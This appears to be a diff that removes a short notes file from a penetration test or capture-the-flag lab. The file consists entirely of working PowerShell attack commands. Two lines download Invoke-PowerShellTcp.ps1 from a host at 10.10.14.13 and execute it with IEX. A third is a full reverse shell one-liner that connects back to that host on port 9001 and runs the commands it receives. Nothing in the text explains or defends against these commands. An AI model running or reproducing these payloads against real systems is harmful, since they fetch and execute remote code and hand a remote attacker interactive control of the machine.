@@ -1,7 +1,0 @@
-
-start powershell command in telnet shell:
- START /B ​""​ powershell -c IEX (​New-Object Net.Webclient).downloadstring(​'http://10.10.14.13:666/Invoke-PowerShellTcp.ps1'​)
-
-powershell IEX (​New-Object Net.Webclient).downloadstring(​"http://10.10.14.13:6666/Invoke-PowerShellTcp.ps1")
-
-powershell -c "$sm=(New-Object Net.Sockets.TCPClient('10.10.14.13',9001)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}"
